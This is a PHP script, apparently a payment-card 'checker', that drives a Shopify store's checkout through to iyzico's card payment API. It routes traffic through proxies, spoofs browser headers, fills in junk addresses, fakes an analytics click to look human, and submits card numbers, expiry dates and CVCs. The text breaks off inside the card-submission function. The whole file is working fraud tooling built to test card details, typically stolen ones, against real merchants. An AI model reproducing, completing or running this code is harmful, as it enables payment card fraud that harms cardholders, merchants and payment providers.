<?php

class IyzicoChecker {
    private $cookies = [];
    private $userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36';
    private $baseUrl = '';
    private $shopifyClientId = '';
    private $cartToken = '';
    private $checkoutUrl = '';
    private $sessionToken = '';
    private $queueToken = '';
    private $attemptToken = '';
    private $stableId = '';
    private $signedHandle = '';
    private $iyziToken = '';
    private $iyziSessionId = '';
    private $iyziCookie = '';
    private $proxy = '';
    private $currency = 'TRY';
    private $price = 0;
    private $variantId = '';
    private $productPath = '';
    private $paymentIdentifier = '';
    private $deliveryHandle = '';
    private $taxAmount = '0.00';

    public function setProxy($proxy) {
        $this->proxy = $proxy;
    }

    private function generateUUID() {
        return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
            mt_rand(0, 0xffff), mt_rand(0, 0xffff),
            mt_rand(0, 0xffff),
            mt_rand(0, 0x0fff) | 0x4000,
            mt_rand(0, 0x3fff) | 0x8000,
            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
        );
    }

    private function request($url, $method = 'GET', $headers = [], $postData = null, $extraCookies = null) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 45);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_ENCODING, '');

        if (!empty($this->proxy)) {
            curl_setopt($ch, CURLOPT_PROXY, $this->proxy);
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
            curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
        }

        $cookieStr = '';
        foreach ($this->cookies as $k => $v) {
            $cookieStr .= "$k=$v; ";
        }
        if ($extraCookies) {
            $cookieStr .= $extraCookies;
        }
        if ($cookieStr) {
            curl_setopt($ch, CURLOPT_COOKIE, rtrim($cookieStr, '; '));
        }

        if ($method === 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        }

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $redirectUrl = curl_getinfo($ch, CURLINFO_REDIRECT_URL);
        $error = curl_error($ch);
        curl_close($ch);

        if ($error) {
            return ['status' => 0, 'headers' => '', 'body' => $error, 'redirect' => ''];
        }

        $responseHeaders = substr($response, 0, $headerSize);
        $body = substr($response, $headerSize);

        preg_match_all('/Set-Cookie:\s*([^=]+)=([^;]*)/i', $responseHeaders, $matches, PREG_SET_ORDER);
        foreach ($matches as $m) {
            $this->cookies[trim($m[1])] = trim($m[2]);
        }

        $location = '';
        if (preg_match('/Location:\s*(.+)/i', $responseHeaders, $lm)) {
            $location = trim($lm[1]);
        }

        return ['status' => $httpCode, 'headers' => $responseHeaders, 'body' => $body, 'redirect' => $location ?: $redirectUrl];
    }

    // Step 0: Scrape product page for dynamic data
    private function scrapeProductPage() {
        $url = $this->baseUrl . '/products/' . $this->productPath;
        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language: en-US,en;q=0.9',
            'sec-ch-ua: "Not;A-Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: none',
            'upgrade-insecure-requests: 1',
            'user-agent: ' . $this->userAgent,
        ];

        $result = $this->request($url, 'GET', $headers);
        echo "[Step 0] Product page: HTTP {$result['status']}\n";
        
        if ($result['status'] !== 200) {
            echo "[Step 0] Failed to load product page\n";
            return false;
        }

        $body = $result['body'];

        // Extract variant ID
        if (preg_match('/"variantId"\s*:\s*"?(\d+)"?/', $body, $m)) {
            $this->variantId = $m[1];
        } elseif (preg_match('/"id"\s*:\s*"gid:\/\/shopify\/ProductVariant\/(\d+)"/', $body, $m)) {
            $this->variantId = $m[1];
        } elseif (preg_match('/variants\[.*?"id"\s*:\s*(\d+)/', $body, $m)) {
            $this->variantId = $m[1];
        }

        // Extract price
        if (preg_match('/"price"\s*:\s*"?([0-9.]+)"?/', $body, $m)) {
            $this->price = (float)$m[1];
        } elseif (preg_match('/"amount"\s*:\s*"?([0-9.]+)"?/', $body, $m)) {
            $this->price = (float)$m[1];
        }

        // Extract currency
        if (preg_match('/"currency"\s*:\s*"?([A-Z]{3})"?/', $body, $m)) {
            $this->currency = $m[1];
        }

        // Extract iyzico payment identifier
        if (preg_match('/"paymentMethodIdentifier"\s*:\s*"([a-f0-9]{32})"/', $body, $m)) {
            $this->paymentIdentifier = $m[1];
        } elseif (preg_match('/iyzico.*?"paymentMethodIdentifier"\s*:\s*"([a-f0-9]+)"/is', $body, $m)) {
            $this->paymentIdentifier = $m[1];
        }

        // If no variant found, try JSON-LD
        if (!$this->variantId && preg_match('/<script type="application\/ld\+json">(.*?)<\/script>/s', $body, $jsonLd)) {
            $ld = json_decode($jsonLd[1], true);
            if (isset($ld['offers'][0]['sku'])) {
                $this->variantId = $ld['offers'][0]['sku'];
            }
        }

        if (!$this->variantId) {
            echo "[Step 0] Could not find variant ID\n";
            return false;
        }

        echo "[Step 0] Variant: {$this->variantId} | Price: {$this->price} {$this->currency} | PaymentID: {$this->paymentIdentifier}\n";
        return true;
    }

    // Step 1: Add to cart
    private function addToCart() {
        $url = $this->baseUrl . '/cart/add.js';
        $headers = [
            'accept: */*',
            'accept-language: en-US,en;q=0.9',
            'content-type: application/json',
            'origin: ' . $this->baseUrl,
            'priority: u=1, i',
            'referer: ' . $this->baseUrl . '/products/' . $this->productPath,
            'sec-ch-ua: "Not;A-Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'user-agent: ' . $this->userAgent,
        ];

        $this->shopifyClientId = $this->generateUUID();
        $this->cookies['localization'] = 'TR';
        $this->cookies['_shopify_y'] = $this->generateUUID();
        $this->cookies['_shopify_s'] = $this->generateUUID();
        $this->cookies['shopify_client_id'] = $this->shopifyClientId;

        $postData = json_encode([
            'items' => [['id' => (int)$this->variantId, 'quantity' => 1, 'properties' => new \stdClass()]]
        ]);

        $result = $this->request($url, 'POST', $headers, $postData);
        echo "[Step 1] Add to cart: HTTP {$result['status']}\n";

        if ($result['status'] !== 200) {
            return false;
        }

        $data = json_decode($result['body'], true);
        if (!$data) {
            echo "[Step 1] Failed to parse response\n";
            return false;
        }

        // Get actual price from cart response
        if (isset($data['items'][0]['final_price'])) {
            $this->price = (float)$data['items'][0]['final_price'] / 100;
        } elseif (isset($data['items'][0]['price'])) {
            $this->price = (float)$data['items'][0]['price'] / 100;
        }

        if (isset($this->cookies['cart'])) {
            $this->cartToken = urldecode($this->cookies['cart']);
            $qPos = strpos($this->cartToken, '?');
            if ($qPos !== false) {
                $this->cartToken = substr($this->cartToken, 0, $qPos);
            }
        }

        echo "[Step 1] Cart token: {$this->cartToken} | Price: {$this->price}\n";
        return true;
    }

    // Step 2: Get checkout page
    private function getCheckout() {
        if (!$this->cartToken) {
            $url = $this->baseUrl . '/checkout';
        } else {
            $url = $this->baseUrl . '/checkouts/cn/' . $this->cartToken . '/tr-tr';
        }

        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language: en-US,en;q=0.9',
            'priority: u=0, i',
            'referer: ' . $this->baseUrl . '/products/' . $this->productPath,
            'sec-ch-ua: "Not;A-Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: same-origin',
            'sec-fetch-user: ?1',
            'upgrade-insecure-requests: 1',
            'user-agent: ' . $this->userAgent,
        ];

        $maxRedirects = 5;
        $currentUrl = $url;
        $body = '';
        $status = 0;

        for ($i = 0; $i < $maxRedirects; $i++) {
            $result = $this->request($currentUrl, 'GET', $headers);
            $status = $result['status'];
            $body = $result['body'];

            if ($status >= 300 && $status < 400 && $result['redirect']) {
                $redirect = $result['redirect'];
                if (strpos($redirect, 'http') !== 0) {
                    $redirect = $this->baseUrl . $redirect;
                }
                $currentUrl = $redirect;
                $this->checkoutUrl = $currentUrl;
                continue;
            }
            break;
        }

        echo "[Step 2] Checkout page: HTTP $status\n";

        if ($status !== 200 || !$body) {
            echo "[Step 2] Failed to load checkout\n";
            return false;
        }

        $this->checkoutUrl = $currentUrl;

        if (preg_match('/sessionToken["\s:]+["\'](AAE[A-Za-z0-9_\-+=\/]+)["\']/', $body, $m)) {
            $this->sessionToken = $m[1];
        }
        if (preg_match('/queueToken["\s:]+["\'](Ax[A-Za-z0-9_\-+=\/]+)["\']/', $body, $m)) {
            $this->queueToken = $m[1];
        }
        if (preg_match('/attemptToken["\s:]+["\']([\w\-]+)["\']/', $body, $m)) {
            $this->attemptToken = $m[1];
        } else {
            $this->attemptToken = $this->cartToken . '-' . substr(md5(time()), 0, 16);
        }
        if (preg_match('/stableId["\s:]+["\']([\w\-]+)["\']/', $body, $m)) {
            $this->stableId = $m[1];
        } else {
            $this->stableId = $this->generateUUID();
        }
        if (preg_match('/signedHandle["\s:]+["\']([\w\+\/=\-]+)["\']/', $body, $m)) {
            $this->signedHandle = $m[1];
        }

        // Extract iyzico payment identifier from checkout page if not found yet
        if (!$this->paymentIdentifier) {
            if (preg_match('/iyzico.*?"paymentMethodIdentifier"\s*:\s*"([a-f0-9]+)"/is', $body, $m)) {
                $this->paymentIdentifier = $m[1];
            } elseif (preg_match('/"paymentMethodIdentifier"\s*:\s*"([a-f0-9]{32})"/', $body, $m)) {
                $this->paymentIdentifier = $m[1];
            }
        }

        // Extract delivery handle
        if (preg_match('/"handle"\s*:\s*"([a-f0-9]{32}-[a-f0-9]{32})"/', $body, $m)) {
            $this->deliveryHandle = $m[1];
        }

        // Extract actual tax from checkout
        if (preg_match('/"totalTax"\s*:\s*\{[^}]*"amount"\s*:\s*"([0-9.]+)"/', $body, $m)) {
            $this->taxAmount = $m[1];
        } elseif (preg_match('/"proposedTotalIncludedAmount"\s*:\s*\{[^}]*"amount"\s*:\s*"([0-9.]+)"/', $body, $m)) {
            $this->taxAmount = $m[1];
        }

        if (preg_match('/checkouts\/cn\/([\w]+)/', $this->checkoutUrl, $m)) {
            $this->cartToken = $m[1];
        }

        echo "[Step 2] Session token: " . substr($this->sessionToken, 0, 40) . "...\n";
        echo "[Step 2] PaymentID: {$this->paymentIdentifier} | DeliveryHandle: {$this->deliveryHandle}\n";
        echo "[Step 2] Cart token: {$this->cartToken}\n";

        return true;
    }

    // Step 3: Submit for completion (GraphQL)
    private function submitForCompletion($email, $firstName, $lastName, $phone) {
        $url = $this->baseUrl . '/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion';

        $headers = [
            'accept: application/json',
            'accept-language: tr-TR',
            'content-type: application/json',
            'origin: ' . $this->baseUrl,
            'priority: u=1, i',
            'referer: ' . $this->checkoutUrl,
            'sec-ch-ua: "Not;A-Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'shopify-checkout-client: checkout-web/1.0',
            'shopify-checkout-source: id="' . $this->cartToken . '", type="cn"',
            'user-agent: ' . $this->userAgent,
            'x-checkout-one-session-token: ' . $this->sessionToken,
            'x-checkout-web-build-id: f2ebb8978752bcfad85c28a708877d9082499349',
            'x-checkout-web-deploy-stage: production',
            'x-checkout-web-server-handling: fast',
            'x-checkout-web-server-rendering: yes',
            'x-checkout-web-source-id: ' . $this->cartToken,
        ];

        $address = [
            'address1' => 'dogkkdmdf',
            'city' => 'ISTANBUL',
            'countryCode' => 'TR',
            'firstName' => $firstName,
            'lastName' => $lastName,
            'phone' => $phone,
        ];

        $paymentId = $this->paymentIdentifier ?: '0b9b116d56e4115db6dd6d489111b44e';
        $deliveryHdl = $this->deliveryHandle ?: 'ba5eae04f72fa075fafa5d02fe76a7b9-ae29b6b82cd53e4966aaa0d41946eae0';
        $priceStr = number_format($this->price, 2, '.', '');

        $input = [
            'sessionInput' => ['sessionToken' => $this->sessionToken],
            'queueToken' => $this->queueToken ?: 'Axpn1k41cyum8f-hOiMOFANKERyquhRmF9N9gvscLQem1Y7x3LVw-i6SDHWsNASwbSWJpTd48nQHrsliDSESikeFIEfKnvEDF1tKsnskB_o2pqb1g6j_iNnh4IhYUvsI93JpRmjxzA15LBw=',
            'discounts' => ['lines' => [], 'acceptUnexpectedDiscounts' => true],
            'delivery' => [
                'deliveryLines' => [[
                    'destination' => ['streetAddress' => $address],
                    'selectedDeliveryStrategy' => [
                        'deliveryStrategyByHandle' => [
                            'handle' => $deliveryHdl,
                            'customDeliveryRate' => false,
                        ],
                        'options' => new \stdClass(),
                    ],
                    'targetMerchandiseLines' => ['lines' => [['stableId' => $this->stableId]]],
                    'deliveryMethodTypes' => ['SHIPPING'],
                    'expectedTotalPrice' => ['value' => ['amount' => '0.00', 'currencyCode' => $this->currency]],
                    'destinationChanged' => false,
                ]],
                'noDeliveryRequired' => [],
                'useProgressiveRates' => false,
                'prefetchShippingRatesStrategy' => null,
                'supportsSplitShipping' => true,
            ],
            'deliveryExpectations' => [
                'deliveryExpectationLines' => $this->signedHandle
                    ? [['signedHandle' => $this->signedHandle]]
                    : [],
            ],
            'merchandise' => [
                'merchandiseLines' => [[
                    'stableId' => $this->stableId,
                    'merchandise' => [
                        'productVariantReference' => [
                            'id' => 'gid://shopify/ProductVariantMerchandise/' . $this->variantId,
                            'variantId' => 'gid://shopify/ProductVariant/' . $this->variantId,
                            'properties' => [],
                            'sellingPlanId' => null,
                            'sellingPlanDigest' => null,
                        ],
                    ],
                    'quantity' => ['items' => ['value' => 1]],
                    'expectedTotalPrice' => ['value' => ['amount' => $priceStr, 'currencyCode' => $this->currency]],
                    'lineComponentsSource' => null,
                    'lineComponents' => [],
                ]],
            ],
            'memberships' => ['memberships' => []],
            'payment' => [
                'totalAmount' => ['any' => true],
                'paymentLines' => [[
                    'paymentMethod' => [
                        'directPaymentMethod' => null,
                        'giftCardPaymentMethod' => null,
                        'redeemablePaymentMethod' => null,
                        'walletPaymentMethod' => null,
                        'walletsPlatformPaymentMethod' => null,
                        'localPaymentMethod' => null,
                        'paymentOnDeliveryMethod' => null,
                        'paymentOnDeliveryMethod2' => null,
                        'manualPaymentMethod' => null,
                        'customPaymentMethod' => null,
                        'offsitePaymentMethod' => [
                            'name' => 'iyzico - Kredi ve Banka Kartları',
                            'paymentMethodIdentifier' => $paymentId,
                            'billingAddress' => ['streetAddress' => $address],
                        ],
                        'customOnsitePaymentMethod' => null,
                        'deferredPaymentMethod' => null,
                        'customerCreditCardPaymentMethod' => null,
                        'paypalBillingAgreementPaymentMethod' => null,
                        'remotePaymentInstrument' => null,
                    ],
                    'amount' => ['value' => ['amount' => (string)round($this->price), 'currencyCode' => $this->currency]],
                ]],
                'billingAddress' => ['streetAddress' => $address],
            ],
            'buyerIdentity' => [
                'customer' => ['presentmentCurrency' => $this->currency, 'countryCode' => 'TR'],
                'email' => $email,
                'emailChanged' => false,
                'phoneCountryCode' => 'TR',
                'marketingConsent' => [['email' => ['consentState' => 'GRANTED', 'value' => $email]]],
                'shopPayOptInPhone' => ['number' => $phone, 'countryCode' => 'TR'],
                'rememberMe' => false,
            ],
            'tip' => ['tipLines' => []],
            'taxes' => [
                'proposedAllocations' => null,
                'proposedTotalAmount' => null,
                'proposedTotalIncludedAmount' => ['value' => ['amount' => $this->taxAmount, 'currencyCode' => $this->currency]],
                'proposedMixedStateTotalAmount' => null,
                'proposedExemptions' => [],
            ],
            'note' => [
                'message' => null,
                'customAttributes' => [
                    ['key' => 'il-adi', 'value' => 'ISTANBUL'],
                    ['key' => 'Ilce', 'value' => ''],
                    ['key' => 'Mahalle', 'value' => ''],
                ],
            ],
            'localizationExtension' => ['fields' => []],
            'nonNegotiableTerms' => null,
            'scriptFingerprint' => [
                'signature' => null,
                'signatureUuid' => null,
                'lineItemScriptChanges' => [],
                'paymentScriptChanges' => [],
                'shippingScriptChanges' => [],
            ],
            'optionalDuties' => ['buyerRefusesDuties' => false],
            'cartMetafields' => [],
        ];

        $body = json_encode([
            'variables' => [
                'input' => $input,
                'attemptToken' => $this->attemptToken,
                'metafields' => [],
                'analytics' => [
                    'requestUrl' => $this->checkoutUrl,
                    'pageId' => strtoupper($this->generateUUID()),
                ],
            ],
            'operationName' => 'SubmitForCompletion',
            'id' => 'b6047b61264c44776db6b89cce9be9f2b646e9226af0681d7e7a0af7c1321293',
        ]);

        $result = $this->request($url, 'POST', $headers, $body);
        echo "[Step 3] SubmitForCompletion: HTTP {$result['status']}\n";

        $data = json_decode($result['body'], true);

        if ($data) {
            $submitResult = $data['data']['submitForCompletion'] ?? null;
            if ($submitResult) {
                echo "[Step 3] Keys: " . implode(', ', array_keys($submitResult)) . "\n";

                $action = $submitResult['action'] ?? null;
                if ($action) {
                    $rUrl = $action['redirectUrl'] ?? $action['url'] ?? null;
                    if ($rUrl) {
                        echo "[Step 3] Action redirect: $rUrl\n";
                        if (preg_match('/retrieve\/([a-f0-9\-]+)/i', $rUrl, $um)) {
                            $this->iyziSessionId = $um[1];
                        }
                        return $rUrl;
                    }
                }

                $receipt = $submitResult['receipt'] ?? null;
                if ($receipt) {
                    $po = $receipt['purchaseOrder'] ?? null;
                    if ($po) {
                        echo "[Step 3] PO keys: " . implode(', ', array_keys($po)) . "\n";
                        if (isset($po['sessionToken'])) {
                            $this->sessionToken = $po['sessionToken'];
                            echo "[Step 3] New session token acquired\n";
                        }
                        if (isset($po['actions'])) {
                            foreach ($po['actions'] as $a) {
                                $rUrl = $a['redirectUrl'] ?? $a['url'] ?? null;
                                if ($rUrl && strpos($rUrl, 'iyzipay') !== false) {
                                    echo "[Step 3] PO action redirect: $rUrl\n";
                                    if (preg_match('/retrieve\/([a-f0-9\-]+)/i', $rUrl, $um)) {
                                        $this->iyziSessionId = $um[1];
                                    }
                                    return $rUrl;
                                }
                            }
                        }
                        if (isset($po['nextAction'])) {
                            $rUrl = $po['nextAction']['redirectUrl'] ?? $po['nextAction']['url'] ?? null;
                            if ($rUrl) {
                                echo "[Step 3] nextAction: $rUrl\n";
                                return $rUrl;
                            }
                        }
                    }
                }
            }

            if (isset($data['errors'])) {
                echo "[Step 3] Errors: " . json_encode($data['errors']) . "\n";
            }
        }

        if (preg_match('/iyzipay\.com[^"\']*retrieve\/([a-f0-9\-]+)/i', $result['body'], $m)) {
            $this->iyziSessionId = $m[1];
            return 'https://api.iyzipay.com/v2/shopify/payment/checkout/retrieve/' . $this->iyziSessionId;
        }

        if ($this->sessionToken) {
            echo "[Step 3] No redirect, polling processing page...\n";
            return $this->pollForRedirect();
        }

        echo "[Step 3] Response: " . substr($result['body'], 0, 1500) . "\n";
        return null;
    }

    // Step 3.5: Processing page'den iyzico redirect al
    private function pollForRedirect() {
        $processingUrl = $this->baseUrl . '/checkouts/cn/' . $this->cartToken . '/processing';

        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language: en-US,en;q=0.9',
            'referer: ' . $this->checkoutUrl,
            'sec-ch-ua: "Not;A-Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: same-origin',
            'sec-fetch-user: ?1',
            'upgrade-insecure-requests: 1',
            'user-agent: ' . $this->userAgent,
        ];

        for ($attempt = 0; $attempt < 5; $attempt++) {
            if ($attempt > 0) sleep(2);

            $currentUrl = $processingUrl;
            for ($r = 0; $r < 8; $r++) {
                $result = $this->request($currentUrl, 'GET', $headers);
                echo "[Step 3.5] Poll #{$attempt}: HTTP {$result['status']} → " . substr($currentUrl, 0, 80) . "\n";

                if ($result['status'] >= 300 && $result['status'] < 400 && $result['redirect']) {
                    $rUrl = $result['redirect'];
                    if (strpos($rUrl, 'iyzipay') !== false || strpos($rUrl, 'iyzico') !== false) {
                        echo "[Step 3.5] iyzico redirect found: $rUrl\n";
                        if (preg_match('/retrieve\/([a-f0-9\-]+)/i', $rUrl, $um)) {
                            $this->iyziSessionId = $um[1];
                        }
                        return $rUrl;
                    }
                    if (strpos($rUrl, 'http') !== 0) {
                        $rUrl = $this->baseUrl . $rUrl;
                    }
                    $currentUrl = $rUrl;
                    continue;
                }

                if ($result['status'] === 200) {
                    $body = $result['body'];
                    if (preg_match('/https?:\/\/[^"\']*iyzipay\.com[^"\']*retrieve\/([a-f0-9\-]+)/i', $body, $m)) {
                        $this->iyziSessionId = $m[1];
                        $foundUrl = 'https://api.iyzipay.com/v2/shopify/payment/checkout/retrieve/' . $this->iyziSessionId;
                        echo "[Step 3.5] Found iyzico URL in body: $foundUrl\n";
                        return $foundUrl;
                    }
                    if (preg_match('/(?:url|href|location)[=\s"\']+\s*(https?:\/\/[^"\'>\s]+iyzipay[^"\'>\s]*)/i', $body, $m)) {
                        echo "[Step 3.5] Found redirect in HTML: {$m[1]}\n";
                        if (preg_match('/retrieve\/([a-f0-9\-]+)/i', $m[1], $um)) {
                            $this->iyziSessionId = $um[1];
                        }
                        return $m[1];
                    }
                }
                break;
            }
        }

        return $this->pollGraphQL();
    }

    // GraphQL PollForCompletion
    private function pollGraphQL() {
        $url = $this->baseUrl . '/checkouts/internal/graphql/persisted?operationName=PollForCompletion';

        $headers = [
            'accept: application/json',
            'accept-language: tr-TR',
            'content-type: application/json',
            'origin: ' . $this->baseUrl,
            'referer: ' . $this->baseUrl . '/checkouts/cn/' . $this->cartToken . '/processing',
            'sec-ch-ua: "Not;A-Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'shopify-checkout-client: checkout-web/1.0',
            'shopify-checkout-source: id="' . $this->cartToken . '", type="cn"',
            'user-agent: ' . $this->userAgent,
            'x-checkout-one-session-token: ' . $this->sessionToken,
            'x-checkout-web-source-id: ' . $this->cartToken,
        ];

        for ($attempt = 0; $attempt < 6; $attempt++) {
            if ($attempt > 0) sleep(2);

            $postData = json_encode([
                'variables' => ['sessionInput' => ['sessionToken' => $this->sessionToken]],
                'operationName' => 'PollForCompletion',
                'id' => 'e74e161b1a3c357b11599aa29e498040923e4f27cd90dd3e7cc74a3a5bfbfb5e',
            ]);

            $result = $this->request($url, 'POST', $headers, $postData);
            echo "[Step 3.5 GQL] Poll #{$attempt}: HTTP {$result['status']}\n";

            $data = json_decode($result['body'], true);
            if (!$data) continue;

            $poll = $data['data']['poll'] ?? $data['data']['pollForCompletion'] ?? null;
            if (!$poll) {
                $bodyStr = $result['body'];
                if (preg_match('/iyzipay\.com[^"\']*retrieve\/([a-f0-9\-]+)/i', $bodyStr, $m)) {
                    $this->iyziSessionId = $m[1];
                    return 'https://api.iyzipay.com/v2/shopify/payment/checkout/retrieve/' . $this->iyziSessionId;
                }
                if (preg_match('/"redirectUrl"\s*:\s*"(https?:[^"]+)"/i', $bodyStr, $m)) {
                    $rUrl = stripslashes($m[1]);
                    echo "[Step 3.5 GQL] redirectUrl found: $rUrl\n";
                    if (preg_match('/retrieve\/([a-f0-9\-]+)/i', $rUrl, $um)) {
                        $this->iyziSessionId = $um[1];
                    }
                    return $rUrl;
                }
                echo "[Step 3.5 GQL] Response: " . substr($bodyStr, 0, 800) . "\n";
                continue;
            }

            $status = $poll['status'] ?? '';
            if ($status === 'PROCESSING') {
                echo "[Step 3.5 GQL] Still processing...\n";
                continue;
            }

            $action = $poll['action'] ?? null;
            if ($action) {
                $rUrl = $action['redirectUrl'] ?? $action['url'] ?? null;
                if ($rUrl) {
                    echo "[Step 3.5 GQL] Redirect: $rUrl\n";
                    if (preg_match('/retrieve\/([a-f0-9\-]+)/i', $rUrl, $um)) {
                        $this->iyziSessionId = $um[1];
                    }
                    return $rUrl;
                }
            }
        }

        echo "[Step 3.5] Failed to get iyzico redirect\n";
        return null;
    }

    // Step 4: Get iyzico payment page
    private function getIyzicoPage($iyziUrl) {
        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language: en-US,en;q=0.9',
            'sec-ch-ua: "Not;A-Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: cross-site',
            'upgrade-insecure-requests: 1',
            'user-agent: ' . $this->userAgent,
        ];

        $currentUrl = $iyziUrl;
        $body = '';
        $status = 0;

        for ($i = 0; $i < 5; $i++) {
            $result = $this->request($currentUrl, 'GET', $headers);
            $status = $result['status'];
            $body = $result['body'];

            if ($status >= 300 && $status < 400 && $result['redirect']) {
                $currentUrl = $result['redirect'];
                continue;
            }
            break;
        }

        echo "[Step 4] iyzico page: HTTP $status\n";

        if (!$body) return false;

        if (preg_match('/iyziToken["\s:=]+["\']([\w\-]+)["\']/', $body, $m)) {
            $this->iyziToken = $m[1];
        } elseif (preg_match('/token["\s:=]+["\']([\w\-]{36})["\']/', $body, $m)) {
            $this->iyziToken = $m[1];
        }

        if (isset($this->cookies['iyzi'])) {
            $this->iyziCookie = $this->cookies['iyzi'];
        }

        if (!$this->iyziSessionId && preg_match('/retrieve\/([a-f0-9\-]+)/i', $currentUrl, $m)) {
            $this->iyziSessionId = $m[1];
        }

        echo "[Step 4] IYZI Token: {$this->iyziToken}\n";
        echo "[Step 4] Session ID: {$this->iyziSessionId}\n";

        return true;
    }

    // Step 5: Countly analytics
    private function sendCountly() {
        $url = 'https://countly.iyzico.com/i';

        $ts = round(microtime(true) * 1000);
        $deviceId = $this->generateUUID();

        $events = [
            [
                'key' => '[CLY]_action',
                'count' => 1,
                'segmentation' => [
                    'type' => 'click',
                    'x' => 664,
                    'y' => 817,
                    'width' => 923,
                    'height' => 683,
                    'view' => '/v2/shopify/payment/checkout/retrieve/' . $this->iyziSessionId,
                    'domain' => 'api.iyzipay.com',
                ],
                'timestamp' => $ts,
                'hour' => (int)date('G'),
                'dow' => (int)date('w'),
                'id' => mt_rand(10000000, 99999999) . $ts,
                'cvid' => md5($ts) . $ts,
            ],
        ];

        $postData = http_build_query([
            'events' => json_encode($events),
            'app_key' => 'de7016e9b70331f97215d5c37f6e0ced6f14b152',
            'device_id' => $deviceId,
            'sdk_name' => 'javascript_native_web',
            'sdk_version' => '24.4.0',
            't' => 1,
            'av' => '0.0',
            'metrics' => json_encode(['_ua' => $this->userAgent]),
            'timestamp' => $ts,
            'hour' => (int)date('G'),
            'dow' => (int)date('w'),
            'rr' => 1,
        ]);

        $headers = [
            'accept: */*',
            'accept-language: en-US,en;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://api.iyzipay.com',
            'priority: u=1, i',
            'referer: https://api.iyzipay.com/',
            'sec-ch-ua: "Not;A-Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: cross-site',
            'user-agent: ' . $this->userAgent,
        ];

        $result = $this->request($url, 'POST', $headers, $postData);
        echo "[Step 5] Countly: HTTP {$result['status']}\n";
        return true;
    }

    // Step 6: iyzico card payment
    private function submitCard($cc, $mm, $yy, $cvv, $holderName) {
        $url = 'https://api.iyzipay.com/payment/iyzipos/checkoutform/auth/ecom';

        $iyziCookieStr = '';
        if ($this->iyziCookie) {
            $iyziCookieStr = 'iyzi=' . $this->iyziCookie;
        }

        $headers = [
            'Accept: application/json',
            'Accept-Language: en-US,en;q=0.9',
            'Connection: keep-alive',
            'Content-Type: application/json',
            'Origin: https://api.iyzipay.com',
            'Referer: https://api.iyzipay.com/v2/shopify/payment/checkout/retrieve/' . $this->iyziSessionId,
            'Sec-Fetch-Dest: empty',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Site: same-origin',
            'User-Agent: ' . $this->userAgent,
            'X-IYZI-TOKEN: ' . $this->iyziToken,
            'sec-ch-ua: "Not;A-Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
        ];

        $postData = json_encode([
            'installment' => 1,
            'paidPrice' => $this->price,
            'paymentChannel' => 'WEB',
            'paymentCard' => [
                'cardNumber' => $cc,
                'cardHolderName' => $holderName,
                'expireYear' => $yy,
                'expireMonth' => $mm,
                'cvc' => $cvv,
